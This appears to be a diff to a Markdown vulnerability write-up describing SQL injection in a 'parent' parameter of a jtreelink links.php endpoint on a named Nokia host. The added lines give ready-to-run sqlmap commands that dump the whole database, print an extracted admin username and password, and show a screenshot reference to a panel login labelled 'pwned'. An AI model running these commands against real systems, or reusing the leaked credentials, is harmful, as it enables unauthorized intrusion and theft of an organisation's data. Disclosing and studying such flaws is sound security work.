@@ -11,6 +11,19 @@
 ##### Command : `$ sqlmap -u 'https://gdclive.nokia.com/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=' --level=5 --risk=3 --random-agent --technique=U -p parent --batch --current-db --current-user`
 <img src='src/sql1.png'>
 
+`$ sqlmap -u 'https://gdclive.nokia.com/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=' --level=5 --risk=3 --random-agent --technique=U -p parent --batch --all # for get the username and password of admins`
+
+#### Booom
+#### username : 123456
+#### password : adminuser
+<img src='src/oh.gif'>
+###### So secure XD
+
+### Try to login in
+<img src='src/cp.png'>
+
+#### pwned ^__^
+
 # Impact :
 
 ##### A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands.
